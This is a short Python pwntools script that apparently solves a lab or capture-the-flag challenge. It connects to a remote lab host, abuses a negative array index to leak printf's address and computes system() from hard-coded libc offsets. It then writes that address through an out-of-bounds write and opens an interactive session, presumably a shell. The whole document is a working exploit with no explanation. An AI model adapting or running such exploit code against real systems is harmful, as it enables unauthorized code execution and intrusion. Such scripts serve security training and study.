from pwn import *

# r = process('./lab')
r = remote('10.113.184.121', 10043)

idx = b'-5'
r.sendlineafter(b'idx: ', idx)
printf_addr = int(r.recvline().strip().decode().split(' ')[-1])
system_addr = printf_addr - 0x606f0 + 0x50d70
log.info(f'printf address = {hex(printf_addr)}')
log.info(f'system address = {hex(system_addr)}')

# raw_input()
r.sendlineafter(b'val: ', str(system_addr).encode())

r.interactive()